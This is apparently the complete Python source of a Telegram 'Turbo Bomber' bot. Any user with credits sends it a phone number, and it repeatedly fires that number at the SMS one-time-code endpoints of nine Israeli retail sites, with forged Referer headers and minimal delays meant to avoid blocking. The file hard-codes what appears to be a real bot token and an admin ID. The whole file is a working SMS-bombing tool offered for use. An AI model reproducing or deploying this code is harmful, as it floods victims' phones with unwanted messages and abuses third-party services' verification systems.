import telebot
import requests
import time
from flask import Flask
from threading import Thread
import os
import uuid
from datetime import datetime, timedelta

# --- שרת Flask ---
app = Flask('')
@app.route('/')
def home(): return "<h1>Turbo Bot - 9 Sites Max Speed</h1>"

def keep_alive():
    t = Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080))))
    t.start()

# --- הגדרות בוט ---
# זכור להזין את הטוקן שלך כאן
API_TOKEN = '8704312677:AAHO8NSIKI6drQMfHANZaBuF5aBJ2z5_nf0' 
ADMIN_ID = 7265913946
bot = telebot.TeleBot(API_TOKEN)

user_data = {}

def get_user(uid):
    if uid not in user_data:
        user_data[uid] = {'credits': 0, 'last_daily': None}
    return user_data[uid]

def attack(m, target, rounds):
    uid = m.from_user.id
    user = get_user(uid)
    
    apis = [
        {"n": "ACE", "u": "https://www.ace.co.il/login/prelogin/stepone", "d": {"form_key": "d0FvqBYicRoR6FlO", "newaut": "1", "phone": target}, "type": "form", "ref": "https://www.ace.co.il/"},
        {"n": "Fox Home", "u": "https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://www.foxhome.co.il/"},
        {"n": "Laline", "u": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://www.laline.co.il/"},
        {"n": "Atmos General", "u": "https://api-ns.atmos.co.il/rest/18/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 6, "source": "web"}, "type": "json", "ref": "https://atmos.co.il/"},
        {"n": "Foot Locker", "u": "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://footlocker.co.il/"},
        {"n": "Fox", "u": "https://fox.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://fox.co.il/"},
        {"n": "Hamal", "u": "https://users-auth.hamal.co.il/auth/send-auth-code", "d": {"value": target, "type": "phone", "projectId": "1"}, "type": "json", "ref": "https://www.hamal.co.il/"},
        {"n": "Mexican", "u": "https://api-ns.atmos.co.il/rest/18/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 18, "source": "web"}, "type": "json", "ref": "https://mexican.co.il/"},
        # האתר החדש - מחסני חשמל / Atmos Club 2
        {"n": "Machsanei Hashmal", "u": "https://api-ns.atmos.co.il/rest/2/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 2, "source": "web"}, "type": "json", "ref": "https://atmos.co.il/"}
    ]

    for r in range(int(rounds)):
        if user['credits'] <= 0:
            bot.send_message(m.chat.id, "No Credits left!")
            break
        
        user['credits'] -= 1
        success_count = 0
        
        for site in apis:
            try:
                h = {"User-Agent": "Mozilla/5.0", "Referer": site["ref"]}
                if site["type"] == "json":
                    res = requests.post(site["u"], json=site["d"], headers=h, timeout=0.8)
                else:
                    res = requests.post(site["u"], data=site["d"], headers=h, timeout=0.8)
                if res.status_code in [200, 201, 204]: success_count += 1
            except: pass
        
        # הודעה קצרה כדי לא להעמיס על טלגרם במהירות הזו
        bot.send_message(m.chat.id, f"⚡️ R{r+1} | Success: {success_count}/9")
        
        # דיליי מינימלי למניעת חסימות IP
        if r < int(rounds) - 1: time.sleep(0.01)

    bot.send_message(m.chat.id, "🏁 Done!")

# --- פקודות ---

@bot.message_handler(commands=['start'])
def start(m):
    bot.send_message(m.chat.id, "🚀 Turbo Bomber Ready!\nUsage: [Rounds] [Phone]")

@bot.message_handler(commands=['me'])
def me(m):
    u = get_user(m.from_user.id)
    bot.send_message(m.chat.id, f"ID: {m.from_user.id}\nCredits: {u['credits']}")

@bot.message_handler(commands=['daily'])
def daily(m):
    u = get_user(m.from_user.id)
    now = datetime.now()
    if u['last_daily'] and now < u['last_daily'] + timedelta(days=1):
        bot.reply_to(m, "Tomorrow!")
    else:
        u['credits'] += 10
        u['last_daily'] = now
        bot.reply_to(m, "Gift! +10 Credits")

@bot.message_handler(commands=['add'])
def add(m):
    if m.from_user.id != ADMIN_ID: return
    try:
        p = m.text.split()
        target = get_user(int(p[1]))
        target['credits'] += int(p[2])
        bot.reply_to(m, "✅ Added")
    except: pass

@bot.message_handler(func=lambda m: True)
def handle(m):
    try:
        p = m.text.split()
        if len(p) == 2 and p[0].isdigit():
            attack(m, p[1], p[0])
    except: pass

if __name__ == "__main__":
    keep_alive()
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=10, drop_pending_updates=True)
        except Exception:
            time.sleep(2)
